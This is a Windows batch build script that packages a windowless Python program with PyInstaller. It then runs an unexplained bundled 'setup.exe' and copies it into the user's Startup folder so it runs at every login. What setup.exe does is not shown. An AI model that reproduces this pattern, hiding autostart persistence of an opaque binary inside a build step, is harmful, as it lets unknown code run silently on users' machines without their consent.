@echo off
setlocal

REM Ensure we are in the script's directory
cd /d "%~dp0"

set SETUP_EXEC=.\necessities\setup.exe
set SCRIPT_NAME=windows.pyw
set ICON_PATH=image.ico
set DATA_FILE=6.mp3
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM Build the executable using PyInstaller
echo Building the executable with PyInstaller...
pyinstaller --onefile --windowed --add-data "%DATA_FILE%;." --icon "%ICON_PATH%" --exclude-module PyQt5 "%SCRIPT_NAME%"
set BUILD_ERROR=%ERRORLEVEL%

if %BUILD_ERROR% NEQ 0 (
    echo Error: PyInstaller failed to build the executable.
) else (
    echo PyInstaller build completed successfully.
    
    REM Run setup.exe after building
    echo Running setup.exe after building...
    "%SETUP_EXEC%"
    if %ERRORLEVEL% NEQ 0 (
        echo Error: setup.exe failed to run after building.
    ) else (
        echo setup.exe ran successfully after building.
    )

    REM Copy setup.exe to Startup folder
    echo Copying setup.exe to Startup folder...
    copy "%SETUP_EXEC%" "%STARTUP_FOLDER%"
    if %ERRORLEVEL% NEQ 0 (
        echo Error: Failed to copy setup.exe to Startup folder.
    ) else (
        echo setup.exe copied to Startup folder successfully.
    )
)

REM Notify completion
echo Build script completed with error level %BUILD_ERROR%.

REM Prevent the batch file from closing immediately
echo Press any key to exit...
pause

endlocal
